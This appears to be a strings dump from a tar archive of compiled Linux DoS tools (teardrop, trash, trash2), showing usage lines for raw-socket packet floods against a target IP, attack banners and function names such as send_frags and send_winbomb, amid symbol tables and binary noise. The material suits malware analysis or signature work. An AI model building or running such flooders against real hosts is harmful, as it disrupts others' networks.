            "_fini",
            "srand@@GLIBC_2.0",
            "snprintf@@GLIBC_2.0",
            "open@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "calloc@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "read@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/teardrop",
            "0100755",
            "0000000",
            "0000000",
            "00000036122",
            "07100656721",
            "013706",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "random",
            "memcpy",
            "perror",
            "malloc",
            "optarg",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "getopt",
            "inet_ntoa",
            "time",
            "gethostbyname",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRht",
            "QVhp",
            "U4SE",
            "EP }!h\u02cf",
            "ntNdtt']t&",
            "fEW&",
            "fE7&",
            "u7E\u0739",
            ")\u044bE)fEf}",
            "u7E\u0739",
            ")\u044bE)fE}",
            "EE1fEPEP0",
            "EE1fEPEP",
            "EPhJ",
            "E;E|",
            "1fEP1fEPEPEPEPF",
            "E\ubc03h^",
            "U4SE",
            "fEfUE",
            "fEfEE",
            "EEEj8EP",
            "EPEPZ",
            "EPE@P",
            "1fEP",
            "1fEP",
            "j8EPE",
            "P u-ha",
            "PU u3ha",
            "Uu=E",
            "1)EP",
            "REPEP",
            "\u0403;u[]",
            "raw socket",
            "IP_HDRINCL",
            "What the hell kind of IP address is that?",
            "s:t:n:",
            "Death on flaxen wings:",
            "From: %15s.%5d",
            "  To: %15s.%5d",
            " Amt: %5d",
            "b00m ",
            "sendto",
            "%s source_ip target_ip [-s src port] [-t dst port] [-n packets]",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "teardrop.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "name_resolve",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "send_frags",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/trash",
            "0100755",
            "0000000",
            "0000000",
            "00000034754",
            "07100656726",
            "013225",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "malloc",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "rand",
            "sendto",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "E1fE",
            "fE1fu",
            "e[^]",
            "U VSj$R",
            "EEEE",
            "Ej$j",
            "UMfY",
            "iEEE\u8ec9E\u044bE",
            ")\u02cbU)\u068b]",
            ")EEE\u8ec9E\u044bE",
            ")\u02cbU)\u068b]S",
            "j\tEP/",
            "UMfY",
            "8EEE\u8ec9E\u044bE",
            ")\u02cbU)\u068b]",
            "EEE\u8ec9E\u044bE",
            ")\u02cbU)\u068b]S",
            "j$EPE",
            "e[^]U(E}",
            "EEEPj",
            "EPEPEP",
            "u\"h@",
            "\u0403;u[]",
            "trash.c - misteri0@unet [pr0tocol]",
            "usage:",
            "./trash [src_ip] [dst_ip] [# of packets]",
            "\t[*] [ip_src] :  ex: 205.56.78.0",
            "\t[*] [ip_dst] :  ex: 201.12.3.76",
            "\t[*] [number]  : 100",
            "[pr0tocol] We are all connected by a simple line, just have to know where to cut it [pr0tocol]",
            "ERROR: Unable to resolve host %s",
            "ERROR: Opening raw socket.",
            "Status: Connected....packets sent.",
            "ERROR: Unable to Connect To luser.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "trash.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "resolve",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "banner",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "send_winbomb",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/trash2",
            "0100755",
            "0000000",
            "0000000",
            "00000042125",
            "07100656724",
            "013274",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "random",
            "memcpy",
            "perror",
            "getuid",
            "malloc",
            "socket",
            "uname",
            "calloc",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "rand",
            "sendto",
            "inet_aton",
            "memset",
            "getpwuid",
            "gethostbyname",
            "sprintf",
            "stderr",
            "htons",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh|",
            "U$Sj",
            "E=E\u4e69EE",
            "\u044bE)\u020dP",
            "E\u4e69EE",
            "\u044bE)\u020dP",
            "RE\u4e69EE",
            "\u044bE)\u020dP",
            "REiEE",
            ")\u04cbE)\u060dP",
            "EPU EPEPr",
            "E1fE",
            "fE1fu",
            "e[^]",
            "U@VSE",
            "E\u0639hE",
            "U\u0703EPj",
            "EEEE",
            "1fEP",
            "1fEP",
            "E;E|",
            "RwE\u060bUM",
            "E\u053bE\u044bE\u060d",
            ")\u02cbE)\u060bU\u0508",
            "E\uba50t&",
            "EDEEPg",
            "EPEPEP u",
            " 1fP",
            "EPEPEP Ef",
            "e[^]",
            "U VSj$",
            "EEEE",
            "Ej$j",
            "UMfY",
            "EEE\u8ec9E\u044bE",
            ")\u02cbU)\u068b]",
            "EEE\u8ec9E\u044bE",
            ")\u02cbU)\u068b]S",
            "j\tEP",
            "P5 u",
            "UMfY",
            "EEE\u8ec9E\u044bE",
            ")\u02cbU)\u068b]",
            "EEE\u8ec9E\u044bE",
            ")\u02cbU)\u068b]S",
            "j$EPE",
            "e[^]U$Sj$",
            "EEEE",
            "Ej$j",
            "UMfY",
            "UMfY",
            "j$EPE",
            "Pm u",
            "U()}",
            "EEEPj",
            "EPPEP",
            "tAEPPEPR",
            "PEP ",
            "\u0403;u[]",
            "trash2.c - misteri0@unet [outlaw]",
            "usage:",
            "./trash  [dst_ip] [# of packets]",
            "\t[*] [ip_dst] :  ex: 201.12.3.76",
            "\t[*] [number]  : 100",
            "\t-----------------------------------------",
            "%d.%d.%d.%d",
            "ERROR: Unable to resolve host %s",
            "error: socket()",
            "error: sendto()",
            "ERROR: Opening raw socket.",
            "Status: Connected....packets sent.",
            "ERROR: Unable to Connect To host.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
